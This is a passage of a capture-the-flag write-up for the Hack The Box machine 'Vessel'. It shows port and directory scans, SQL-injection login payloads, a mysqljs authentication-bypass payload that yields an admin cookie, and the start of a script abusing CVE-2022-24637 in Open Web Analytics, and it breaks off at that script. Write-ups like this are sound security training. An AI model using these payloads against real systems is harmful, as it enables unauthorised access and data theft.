<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.7.32">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2022-09-02">
<meta name="description" content="Vessel is a hard-rated Linux machine from Hack The Box. I really really liked this box, it was straight to the point and not any real rabbit holes. The path to both user and root was easily identified, however getting there took a lot of research and some time spent bashing the head on the keyboard. There are scripting parts needed to complete this box, something that I am not very good at, but it was simple enough for even me to enjoy it. I was introduced to a few new tools and techniques, and learned a lot. This is an amazing box, I would recommend it to anyone that enjoys scripting or would like to learn.">

<title>Vessel - Hack The Box – Exploit.se</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
html { -webkit-text-size-adjust: 100%; }
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed quarto-light">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../writeups.html"> 
<span class="menu-text">Writeups</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Vessel - Hack The Box</h1>
                  <div>
        <div class="description">
          Vessel is a hard-rated Linux machine from Hack The Box. I really really liked this box, it was straight to the point and not any real rabbit holes. The path to both user and root was easily identified, however getting there took a lot of research and some time spent bashing the head on the keyboard. There are scripting parts needed to complete this box, something that I am not very good at, but it was simple enough for even me to enjoy it. I was introduced to a few new tools and techniques, and learned a lot. This is an amazing box, I would recommend it to anyone that enjoys scripting or would like to learn.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
                <div class="quarto-category">linux</div>
                <div class="quarto-category">nodejs</div>
                <div class="quarto-category">sqli</div>
                <div class="quarto-category">openwebanalytics</div>
                <div class="quarto-category">python</div>
                <div class="quarto-category">pyinstxtractor</div>
                <div class="quarto-category">uncompyle6</div>
                <div class="quarto-category">runc</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">September 2, 2022</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
  <li><a href="#step-6" id="toc-step-6" class="nav-link" data-scroll-target="#step-6">Step 6</a></li>
  <li><a href="#step-7" id="toc-step-7" class="nav-link" data-scroll-target="#step-7">Step 7</a></li>
  </ul></li>
  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
  <ul class="collapse">
  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
  </ul></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> 10.10.11.178</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.92 <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2022-08-29 09:37 CEST</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for 10.10.11.178</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.031s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 65533 closed tcp ports <span class="er">(</span><span class="ex">conn-refused</span><span class="kw">)</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> <span class="at">-p22,80</span> 10.10.11.178</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3072</span> 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.41 <span class="er">(</span><span class="kw">(</span><span class="ex">Ubuntu</span><span class="kw">))</span></span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Vessel</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-trane-info:</span> Problem with XML parsing of /evox/about</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Apache/2.4.41 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel dirb http://10.10.11.178</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">START_TIME:</span> Mon Aug 29 09:39:29 2022</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">URL_BASE:</span> http://10.10.11.178/</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">WORDLIST_FILES:</span> /usr/share/dirb/wordlists/common.txt</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-----------------</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">GENERATED</span> WORDS: 4612                                                          </span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="ex">----</span> Scanning URL: http://10.10.11.178/ <span class="at">----</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/401 <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:2400</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/404 <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:2393</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/500 <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:2335</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/admin <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:28</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/Admin <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:28</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/ADMIN <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:28</span><span class="kw">)</span>                                                                                                               </span>
<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/charts <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:26</span><span class="kw">)</span>                                                                                                              </span>
<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/css <span class="er">(</span><span class="ex">CODE:301</span><span class="kw">|</span><span class="ex">SIZE:173</span><span class="kw">)</span>                                                                                                                </span>
<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/dev <span class="er">(</span><span class="ex">CODE:301</span><span class="kw">|</span><span class="ex">SIZE:173</span><span class="kw">)</span>                                                                                                                </span>
<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/img <span class="er">(</span><span class="ex">CODE:301</span><span class="kw">|</span><span class="ex">SIZE:173</span><span class="kw">)</span>                                                                                                                </span>
<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/js <span class="er">(</span><span class="ex">CODE:301</span><span class="kw">|</span><span class="ex">SIZE:171</span><span class="kw">)</span>                                                                                                                 </span>
<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/login <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:4213</span><span class="kw">)</span>                                                                                                             </span>
<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/Login <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:4213</span><span class="kw">)</span>                                                                                                             </span>
<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/logout <span class="er">(</span><span class="ex">CODE:302</span><span class="kw">|</span><span class="ex">SIZE:28</span><span class="kw">)</span>                                                                                                              </span>
<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/register <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:5830</span><span class="kw">)</span>                                                                                                          </span>
<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.178/server-status <span class="er">(</span><span class="ex">CODE:403</span><span class="kw">|</span><span class="ex">SIZE:277</span><span class="kw">)</span>  </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://vessel.htb</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">http://vessel.htb</span> <span class="er">(</span><span class="ex">0.2s</span><span class="kw">)</span><span class="bu">:</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Apache,</span> 2.4.41 <span class="er">(</span><span class="ex">Web</span> servers<span class="kw">)</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Google</span> Font API,  <span class="er">(</span><span class="ex">Font</span> scripts<span class="kw">)</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Lightbox,</span>  <span class="er">(</span><span class="ex">JavaScript</span> libraries<span class="kw">)</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Express,</span>  <span class="er">(</span><span class="ex">Web</span> frameworks, Web servers<span class="kw">)</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node.js,</span>  <span class="er">(</span><span class="ex">Programming</span> languages<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://vessel.htb <span class="at">-H</span> <span class="st">"Host: FUZZ.vessel.htb"</span> <span class="at">-fw</span> 5599</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">N/A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Visiting port 80 we find <code>vessel.htb</code> in the footer, add it to <code>/etc/hosts</code>.</p>
<p>Trying to create an account we get the response <em>“Currently not available!”</em>, and looking in the HTTP POST the body is empty.</p>
<p><img src="images/vessel01.png" class="img-fluid"></p>
<p><img src="images/vessel02.png" class="img-fluid"></p>
<p>Same thing goes for the Password Recovery function - <em>“Currently not available!”</em> and no data in the POST body.</p>
<p><img src="images/vessel03.png" class="img-fluid"></p>
<p><img src="images/vessel04.png" class="img-fluid"></p>
<p>Changing focus to the login function. Testing different SQL Injection payloads we get the response <em>“Wrong credentials! Try Again!”</em> several times, example:</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Request:</span> username=admin<span class="st">' or '</span>1<span class="st">'='</span>1<span class="st">'#&amp;password=pass'</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Respone:</span> Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Request:</span> username=admin<span class="st">" or "</span>1<span class="st">"="</span>1<span class="st">"/*&amp;password=pass'</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="st">Response: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="st">Request: username=admin"</span> or <span class="st">"1"</span>=<span class="st">"1"</span>--<span class="kw">&amp;</span><span class="va">password</span><span class="op">=</span>pass<span class="st">'</span></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="st">Response:Wrong credentials! Try Again!,Wrong credentials! Try Again!</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Googling about nodejs sql injection I come across <a href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4">this post</a> explaining a authentication bypass technique. <strong>TLDR;</strong></p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="va">username</span><span class="op">=</span>admin<span class="kw">&amp;</span><span class="va">password</span><span class="op">[</span>password<span class="op">]=</span>1</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Will bypass authentication and generate a admin cookie.</p>
<p><img src="images/vessel05.png" class="img-fluid"></p>
<p>Add the cookie to your local storage and browse to http://vessel.htb/admin and continue enumerating.</p>
<p>Pressing <code>Analytics</code> from the drop down bar in the top right corener forwards us to <code>openwebanalytics.vessel.htb</code> - add it to <code>/etc/hosts</code></p>
<p><img src="images/vessel06.png" class="img-fluid"></p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://openwebanalytics.vessel.htb/FUZZ <span class="at">-b</span> <span class="st">"connect.sid=s%3AHesPODZMoKvc6J1HoyB3bOrgfQ94Oist.EJSYnEx%2Bzt9qCM4jC0sFUQiTfiZEWZf0AkfHELtFuaI"</span> <span class="at">-fs</span> 26</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.htaccess</span>               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3231ms]</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">.htpasswd</span>               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3567ms]</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">api</span>                     [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 28ms]</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">conf</span>                    [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 33ms]</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">includes</span>                [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 34ms]</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">modules</span>                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 28ms]</span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">plugins</span>                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 29ms]</span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">server-status</span>           [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 30ms]</span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">vendor</span>                  [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 33ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Looking on the source code we see that it’s running <strong>version 1.7.3</strong>:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>LINK <span class="va">REL</span><span class="op">=</span>StyleSheet <span class="va">HREF</span><span class="op">=</span><span class="st">"http://openwebanalytics.vessel.htb/modules/base/css/owa.css?version=1.7.3"</span> <span class="va">TYPE</span><span class="op">=</span><span class="st">"text/css"</span><span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Reading about version 1.7.3 I come across <a href="https://devel0pment.de/?p=2494">this post</a> covering CVE-2022-24637 where use of single quotes cause sensitive information to be printed in the php cache file. The cache files are stored here: <code>http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/</code></p>
<p>And when no cache file is present we see this empty directory:</p>
<p><img src="images/vessel07.png" class="img-fluid"></p>
<p>A cache file is generated once a user logs in to the application, and at the same time <code>index.php</code> is also generated to hide the files in the directory. We can generate cache files by doing invalid logins, however since <code>index.php</code> is created all we see is a blank page. We need to find a way to calculate the name of the cache file, and luckily it is quiet simple.</p>
<p>Here’s a short script I made to calculate the file name, and do a GET request to capture the base64 encoded data</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> hashlib <span class="im">import</span> md5</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
